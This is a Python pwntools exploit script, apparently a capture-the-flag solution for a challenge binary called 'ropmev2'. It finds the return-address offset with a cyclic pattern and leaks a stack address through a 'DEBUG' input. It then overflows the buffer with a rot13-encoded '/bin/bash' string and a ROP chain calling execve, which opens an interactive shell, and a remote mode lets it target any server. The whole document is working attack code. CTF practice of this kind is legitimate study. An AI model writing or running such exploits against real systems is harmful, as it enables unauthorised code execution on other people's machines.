from pwn import *
import codecs


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('Please dont hack me', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(rot13(p.corefile.read(p.corefile.sp, 4).decode()))
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Basic rot13 encoder
def rot13(s): return codecs.getencoder("rot-13")(s)[0]


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x401168
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ropmev2'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

# Create ROP object
rop = ROP(elf)

# DEBUG first, to leak the stack address
io.sendlineafter('Please dont hack me', 'DEBUG')
print(io.recvuntil('I dont know what this is '))
leaked_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("leaked_address: %#x", leaked_addr)

bin_bash = rot13("/bin/bash\x00")  # We want this at start of our padding (-224)
padding = asm('nop') * (offset - len(bin_bash))  # Adjust padding to allow

# Let ROP object do the hardwork ;)
rop.call('execve', [leaked_addr - 224])

# Syscall payload
payload = flat([
    bin_bash,  # Our /bin/bash string
    padding,  # Padding up to RIP
    rop.chain()
])

# Send payload and get leaked address
io.sendlineafter('Please dont hack me', payload)

# Got Shell?
io.interactive()
